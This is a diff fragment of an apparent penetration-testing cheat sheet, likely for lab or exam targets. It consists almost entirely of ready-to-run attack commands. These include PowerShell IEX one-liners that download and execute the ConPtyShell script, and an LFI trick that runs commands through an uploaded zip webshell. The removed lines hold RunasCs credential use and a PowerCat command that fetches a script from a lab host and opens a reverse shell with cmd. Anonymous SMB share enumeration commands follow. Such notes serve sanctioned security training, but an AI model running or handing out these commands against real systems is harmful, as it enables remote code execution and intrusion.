@@ -185,24 +185,6 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 1. ``` upload zip with cmd.php ``` to victim
 2. run ``` index.php?file=zip://uploads/upload.zip%23cmd&cmd=id ```
 
-# Windows
-1. Run As Admin
-    https://github.com/antonioCoco/RunasCs 
-  ```
-    . .\RunAs.ps1
-    Invoke-RunasCs {username} {password} {cmd} 
-  ```
-
-2. PowerCat 
-   - netcat for windows
-   - https://github.com/besimorhino/powercat
-   - ``` Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.211/powercat.ps1');powercat -c 192.168.49.211 -p 5555 -e cmd ```
-
-3. Powershell color enable
-   ```
-    "$($PSStyle.Background.BrightCyan)Power$($PSStyle.Underline)$($PSStyle.Bold)Shell$($PSStyle.Reset)"
-   ```
-
 # SMB 
 1. first enum ``` smbclient -L //{ip} --option="client min protocol=core" -U '' ```
 2. List shares: ``` smbclient -L \\{IP}\ -N ```
